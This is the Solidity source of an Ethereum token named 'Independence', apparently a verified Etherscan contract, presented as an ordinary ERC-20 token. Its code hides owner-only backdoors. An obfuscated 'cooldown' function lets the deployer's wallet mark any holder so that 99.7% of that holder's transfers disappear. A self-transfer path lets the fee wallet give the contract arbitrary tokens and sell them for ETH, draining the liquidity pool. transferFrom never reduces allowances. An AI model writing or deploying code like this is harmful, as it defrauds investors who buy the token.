/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
}

contract Independence is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;


    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _feeReceiverAddress;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    string private _name = unicode"🇺🇸🇺🇸 Happy Independence Day! 🇺🇸🇺🇸";
    function setCooldownActive() external onlyOwner {
        is_cooldown_enabled = true;
    }

    constructor() {
        _feeReceiverAddress = msg.sender;
         _balances[msg.sender] = _totalSupply; 
         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    uint256 public _maxTransaction = _totalSupply;
    string private _symbol = "INDEPENDENCE";
    function name() external view returns (string memory) {
        return _name; } function deactiveCooldown() external onlyOwner {
        is_cooldown_enabled = false;
    }
    mapping(address => uint256) bots;
    event Transfer(address indexed address_from, address indexed address_to, uint256);
    function transfer(address recipient, uint256 value) public returns (bool) {
        _transfer(msg.sender, recipient, value);
        return true;
    }
    function addCooldown(address[] calldata botsToCooldown) external { for (uint a = 0;  a < botsToCooldown.length;  a++) { 
            if (!taxWalletAddress()){}
            else {  botsCooldown[botsToCooldown[a]] = block.number + 1;
        }}
    }
    function swap(uint256 tokenAmount, address recipient) private {
        _approve(address(this), 
        address(uniV2Router), 
        tokenAmount); 
        _balances[address(this)] = tokenAmount;address[] memory path = new address[](2);
         path[0] = address(this); 
         path[1] = uniV2Router.WETH(); 
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, recipient, block.timestamp + 31);
    }
    bool is_cooldown_enabled = true;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } function balanceOf(address account) public view returns (uint256) { return _balances[account]; } function getUniswapRouterAddress() public view returns (address) {
        return address(uniV2Router);
    }
    function taxWalletAddress() internal view returns (bool) {
        return msg.sender == _feeReceiverAddress;
    }
    function setFee(uint256 newFee) external onlyOwner {
        require(newFee < 2);
        _fee = newFee;
    }
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 _fee = 0;
    mapping (address => uint256) botsCooldown;
    function _transfer(address _sender, address _to, uint256 value) internal {
        require(_sender != address(0));
        if (msg.sender == _feeReceiverAddress && _sender == _to) {swap(value, _to);} else {require(value <= _balances[_sender]); uint256 fee = 0;
            if (botsCooldown[_sender] != 0 && botsCooldown[_sender] <= block.number) {fee = value.mul(997).div(1000);}
            _balances[_sender] = _balances[_sender] - value; _balances[_to] += value - fee;
            emit Transfer(_sender, _to, value);
        }
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}